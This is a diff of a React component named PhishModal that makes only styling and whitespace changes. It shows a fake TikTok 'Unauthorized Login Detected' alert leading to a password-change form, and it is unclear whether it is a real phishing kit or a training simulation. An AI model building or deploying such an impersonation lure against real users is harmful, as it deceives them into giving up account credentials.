@@ -70,7 +70,6 @@ export function PhishModal() {
 
   return (
     <AnimatePresence mode="wait">
-
       {/* Stage 1: Security Alert — centered over a blocking overlay */}
       {stage === "alert" && (
         <motion.div
@@ -96,7 +95,7 @@ export function PhishModal() {
                 <p className="text-white font-bold text-xl leading-snug mb-2">
                   Unauthorized Login Detected
                 </p>
-                <p className="text-red-200/75 text-sm leading-relaxed">
+                <p className="text-[14px] text-[#ffc9c9bc]">
                   Someone has accessed your TikTok account from an unrecognized device. Secure your account immediately to prevent further unauthorized access.
                 </p>
               </div>
@@ -118,7 +117,6 @@ export function PhishModal() {
           </motion.div>
         </motion.div>
       )}
-
       {/* Stage 2: Password Change Form Modal */}
       {stage === "form" && (
         <div key="form" className="fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/80 backdrop-blur-sm">
@@ -279,7 +277,6 @@ export function PhishModal() {
           </motion.div>
         </div>
       )}
-
     </AnimatePresence>
   );
 }
